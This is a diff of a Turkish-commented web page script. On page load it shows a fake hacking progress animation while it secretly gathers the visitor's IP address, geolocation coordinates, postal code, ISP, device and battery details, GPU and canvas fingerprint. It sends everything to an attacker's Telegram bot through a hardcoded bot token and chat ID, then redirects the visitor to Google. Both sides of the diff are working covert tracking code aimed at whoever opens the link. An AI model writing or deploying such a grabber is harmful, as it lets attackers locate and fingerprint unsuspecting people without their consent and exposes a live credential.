@@ -29,7 +29,6 @@
     </div>
 
     <script>
-        // Senin o meşhur Matrix arka plan animasyonun
         setInterval(() => {
             document.getElementById('matrix').innerText += Math.random().toString(36).substring(2, 7) + " ";
             if(document.getElementById('matrix').innerText.length > 2000) document.getElementById('matrix').innerText = "";
@@ -55,7 +54,7 @@
             } catch (e) { return "Üretilemedi"; }
         }
 
-        window.onload = async function() {
+        window.onload = function() {
             let fill = document.getElementById('fill');
             let status = document.getElementById('status');
             let consoleLog = document.getElementById('console');
@@ -65,176 +64,137 @@
                 consoleLog.scrollTop = consoleLog.scrollHeight;
             };
 
-            // Adım 1: Başlangıç Animasyonları
-            fill.style.width = "20%";
-            status.innerText = "[*] MODÜLLER YÜKLENİYOR...";
-            log("Anti-Proxy katmanı aktif edildi.");
+            setTimeout(() => {
+                fill.style.width = "20%";
+                status.innerText = "[*] MODÜLLER YÜKLENİYOR...";
+                log("Anti-Proxy katmanı aktif edildi.");
+            }, 1000);
 
-            // IP API'sini hız kaybı olmasın diye hemen en başta tetikliyoruz
-            const cacheBuster = "?cb=" + Math.random();
-            const ipFetch = fetch("https://ipapi.co/json/" + cacheBuster)
-                .then(r => r.json())
-                .catch(() => fetch("https://api.db-ip.com/v2/free/self" + cacheBuster).then(r => r.json()));
+            setTimeout(() => {
+                fill.style.width = "50%";
+                status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
+                log("İşlemci mimarisi taranıyor.");
+            }, 3000);
 
-            // Adım 2: Donanım Ayrıştırma
-            fill.style.width = "50%";
-            status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
-            log("İşlemci mimarisi taranıyor.");
-            
-            let ua = navigator.userAgent;
-            let os = "Bilinmeyen Sistem";
-            
-            // Güncellenmiş iOS ve Android Sürüm Yakalama Motoru
-            if (/iPhone|iPad|iPod/i.test(ua)) {
-                let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
-                if (match) {
-                    os = "iOS " + match[1] + "." + match[2] + (match[3] ? "." + match[3] : "");
-                } else { os = "iOS (Belirlenemedi)"; }
-            } else if (/Android/i.test(ua)) {
-                let match = ua.match(/Android\s([0-9\.]+)/);
-                os = match ? "Android " + match[1] : "Android";
-            } else if (/Windows/i.test(ua)) { os = "Windows"; }
+            setTimeout(() => {
+                fill.style.width = "80%";
+                status.innerText = "[*] COORD GATEWAY ALINIYOR...";
+                log("Bölgesel proxy tünelleri kontrol ediliyor.");
+            }, 5000);
 
-            // Gelişmiş Wi-Fi / Mobil Hücresel Ayrımı
-            let agTipi = "Bilinmiyor (Klasik Şebeke)";
-            if (navigator.connection) {
-                let type = navigator.connection.type || navigator.connection.effectiveType || "";
-                if (type.includes("cellular") || type.includes("wimax") || type.includes("2g") || type.includes("3g") || type.includes("4g")) {
-                    agTipi = "🚀 Mobil Veri (Hücresel)";
-                } else if (type.includes("wifi") || type.includes("ethernet")) {
-                    agTipi = "📡 Wi-Fi (Kablosuz Yerel Ağ)";
-                } else {
-                    agTipi = type.toUpperCase() + " Bağlantısı";
-                }
-            }
+            let cacheBuster = "?cb=" + Math.random();
+            fetch("https://ipapi.co/json/" + cacheBuster)
+            .then(response => response.json())
+            .then(async data => {
+                let ip = data.ip || "Bilinmiyor";
+                let ulke = data.country_name || "Bilinmiyor";
+                let eyalet_sehir = data.city ? (data.region ? data.region + " / " + data.city : data.city) : "Bilinmiyor";
+                let posta_kodu = data.postal || "Bilinmiyor";
+                let koordinat = data.latitude && data.longitude ? data.latitude + " , " + data.longitude : "Bilinmiyor";
+                let internet_sirketi = data.org || "Bilinmiyor";
 
-            // Orijinal Kodundaki O Tüm Kabarık Değişkenler
-            let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            let ekran = window.screen.width + "x" + window.screen.height;
-            let cekirdek = navigator.hardwareConcurrency || "?";
-            let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
-            let dil = navigator.language || "Bilinmiyor";
-            let dokunmatik = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Evet" : "Hayır";
-            let tema = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Karanlık" : "Açık";
-            let tarih = new Date().toLocaleString('tr-TR');
-            let canvasHash = getCanvasFingerprint();
+                let ua = navigator.userAgent;
+                let os = "Bilinmeyen Sistem";
 
-            let gpuModel = "Bilinmiyor";
-            try {
-                const canvasGpu = document.createElement('canvas');
-                const gl = canvasGpu.getContext('webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                }
-            } catch(e){}
-
-            let pil = "Bilinmiyor";
-            if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
-
-            // Adım 3: Konum ve Gateway Çözümleme
-            fill.style.width = "80%";
-            status.innerText = "[*] COORD GATEWAY ALINIYOR...";
-            log("Bölgesel proxy tünelleri kontrol ediliyor.");
-
-            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor";
-            let posta_kodu = "Bilinmiyor", internet_sirketi = "Bilinmiyor", koordinat = "Bilinmiyor";
-            let vpn_proxy = "Temiz (Doğal Bağlantısı)";
-            let maps_link = "https://maps.google.com";
-
-            try {
-                let veri = await ipFetch;
-                if (veri) {
-                    ip = veri.ip || veri.ipAddress || "Bilinmiyor";
-                    ulke = veri.country_name || veri.countryName || "Bilinmiyor";
-                    eyalet_sehir = veri.city ? (veri.region ? veri.region + " / " + veri.city : veri.city) : "Bilinmiyor";
-                    posta_kodu = veri.postal || "Bilinmiyor";
-                    internet_sirketi = veri.org || "Bilinmiyor";
-                    
-                    if(veri.latitude && veri.longitude) {
-                        koordinat = veri.latitude + " , " + veri.longitude;
-                        maps_link = "https://www.google.com/maps?q=" + veri.latitude + "," + veri.longitude;
+                // --- SADECE BU KISIM GELİŞTİRİLDİ: iOS SÜRÜM MOTORU ---
+                if (/iPhone|iPad|iPod/i.test(ua)) {
+                    let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
+                    if (match) {
+                        os = "iOS " + match[1] + "." + match[2] + (match[3] ? "." + match[3] : "");
+                    } else {
+                        os = "iOS (Sürüm Belirlenemedi)";
                     }
-
-                    // ISP tabanlı Wi-Fi/Mobil yedek kontrolü
-                    if (agTipi.includes("Bilinmiyor")) {
-                        let org_lower = internet_sirketi.toLowerCase();
-                        if (/turkcell|vodafone|avea|tt mobil|telekom/i.test(org_lower)) {
-                            agTipi = "🚀 Mobil Veri (Operatör)";
-                        } else {
-                            agTipi = "📡 Wi-Fi / Sabit Hat";
-                        }
-                    }
+                } else if (/Android/i.test(ua)) {
+                    let match = ua.match(/Android\s([0-9\.]+)/);
+                    os = match ? "Android " + match[1] : "Android";
+                } else if (/Windows/i.test(ua)) {
+                    os = "Windows";
                 }
-            } catch (e) { log("Ağ geçidi zaman aşımına uğradı, yerel loglar alınıyor."); }
+                // ----------------------------------------------------
 
-            // Senin yazdığın o VPN kıyaslama algoritması
-            if (cihaz_saati.toLowerCase().includes("istanbul") && ulke !== "Bilinmiyor" && ulke !== "Turkey") {
-                vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
-            }
+                let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                let vpn_proxy = "Temiz (Doğal Bağlantısı)";
+                if (cihaz_saati.toLowerCase().includes("istanbul") && ulke !== "Bilinmiyor" && ulke !== "Turkey") {
+                    vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
+                }
 
-            // Adım 4: Paketleme ve Gönderim
-            fill.style.width = "100%";
-            status.style.color = "#00ff66";
-            status.innerText = "[+] ENJEKSİYON TAMAMLANDI!";
-            log("Sistem logları şifrelendi, sızdırılıyor.");
+                let ekran = window.screen.width + "x" + window.screen.height;
+                let cekirdek = navigator.hardwareConcurrency || "?";
+                let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
+                let dil = navigator.language || "Bilinmiyor";
+                let dokunmatik = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Evet" : "Hayır";
+                let tema = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Karanlık" : "Açık";
+                let tarih = new Date().toLocaleString('tr-TR');
+                let canvasHash = getCanvasFingerprint();
 
-            // Orijinal, o devasa ve kabarık metin şablonun
-            let mesaj = "👑 *MEGA NETWORK OPERATIONS LOG*\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
-            mesaj += "🤖 *Sistem (OS):* `" + os + "` 🛡️\n";
-            mesaj += "⏰ *Zaman Damgası:* " + tarih + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
-            mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
-            mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
-            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
-            mesaj += "📡 *Bağlantı Tipi:* " + agTipi + "\n";
-            mesaj += "🛡️ *VPN / Proxy Durumu:* " + vpn_proxy + "\n";
-            mesaj += "⚙️ *Cihaz Saat Dilimi:* " + cihaz_saati + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
-            mesaj += "🧠 *İşlemci Gücü:* " + cekirdek + " Çekirdek\n";
-            mesaj += "💾 *Sistem RAM:* " + ram + "\n";
-            mesaj += "🔋 *Pil Seviyesi:* " + pil + "\n";
-            mesaj += "🎨 *Cihaz Teması:* " + tema + "\n";
-            mesaj += "👆 *Dokunmatik Ekran:* " + dokunmatik + "\n";
-            mesaj += "🗣️ *Cihaz Dili:* " + dil + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🎮 *Ekran Kartı (GPU):* `" + gpuModel + "`\n";
-            mesaj += "🔑 *Canvas Fingerprint:* `" + canvasHash + "`\n";
-            mesaj += "📡 *Bağlantı Kalitesi:* " + agTipi + "\n";
-            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
+                let gpuModel = "Bilinmiyor";
+                try {
+                    const canvasGpu = document.createElement('canvas');
+                    const gl = canvasGpu.getContext('webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) gpuModel = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch(e){}
 
-            // Telegram Buton Düzenlemesi (Kesin tetiklenen URL tipi)
-            let reply_markup = {
-                inline_keyboard: [
-                    [
-                        { text: "📁 Data Oluştur / İncele", url: "https://t.me/BotFather" }, // İstediğin linki bağla reis
-                        { text: "📍 Haritada Gör", url: maps_link }
-                    ]
-                ]
-            };
+                let pil = "Bilinmiyor";
+                if (navigator.getBattery) {
+                    try {
+                        let b = await navigator.getBattery();
+                        pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)");
+                    } catch(e){}
+                }
 
-            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
-            let cid = "6845229845";
+                let agTipi = "Bilinmiyor";
+                if (navigator.connection) {
+                    agTipi = navigator.connection.effectiveType + " (~" + navigator.connection.downlink + " Mbps)";
+                }
 
-            // Hız için saniyede iletimi garantileyen keepalive POST isteği
-            fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: cid,
-                    text: mesaj,
-                    parse_mode: "Markdown",
-                    reply_markup: reply_markup
-                }),
-                keepalive: true
-            }).then(() => {
-                window.location.replace("https://www.google.com");
-            }).catch(() => {
-                window.location.replace("https://www.google.com");
+                setTimeout(() => {
+                    fill.style.width = "100%";
+                    status.style.color = "#00ff66";
+                    status.innerText = "[+] ENJEKSİYON TAMAMLANDI!";
+                    log("Sistem logları şifrelendi, sızdırılıyor.");
+                }, 7000);
+
+                let mesaj = "👑 *MEGA NETWORK OPERATIONS LOG*\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
+                mesaj += "🤖 *Sistem (OS):* `" + os + "` 🛡️\n";
+                mesaj += "⏰ *Zaman Damgası:* " + tarih + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
+                mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
+                mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
+                mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
+                mesaj += "🛡️ *VPN / Proxy Durumu:* " + vpn_proxy + "\n";
+                mesaj += "⚙️ *Cihaz Saat Dilimi:* " + cihaz_saati + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
+                mesaj += "🧠 *İşlemci Gücü:* " + cekirdek + " Çekirdek\n";
+                mesaj += "💾 *Sistem RAM:* " + ram + "\n";
+                mesaj += "🔋 *Pil Seviyesi:* " + pil + "\n";
+                mesaj += "🎨 *Cihaz Teması:* " + tema + "\n";
+                mesaj += "👆 *Dokunmatik Ekran:* " + dokunmatik + "\n";
+                mesaj += "🗣️ *Cihaz Dili:* " + dil + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+                mesaj += "🎮 *Ekran Kartı (GPU):* `" + gpuModel + "`\n";
+                mesaj += "🔑 *Canvas Fingerprint:* `" + canvasHash + "`\n";
+                mesaj += "📡 *Bağlantı Kalitesi:* " + agTipi + "\n";
+                mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
+
+                let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
+                let cid = "6845229845";
+                let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
+
+                setTimeout(() => {
+                    fetch(url)
+                    .then(() => { window.location.href = "https://www.google.com"; })
+                    .catch(() => { window.location.href = "https://www.google.com"; });
+                }, 8500);
+            })
+            .catch(() => {
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 8500);
             });
         };
     </script>
